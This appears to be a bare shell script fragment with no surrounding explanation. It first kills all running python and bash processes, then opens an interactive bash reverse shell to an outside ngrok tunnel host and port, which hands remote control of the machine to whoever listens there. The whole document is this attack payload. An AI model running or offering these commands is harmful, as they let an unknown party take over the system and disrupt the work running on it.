pkill -f python
pkill -f bash
killall python3 2>/dev/null; killall bash 2>/dev/null




bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12642 0>&1
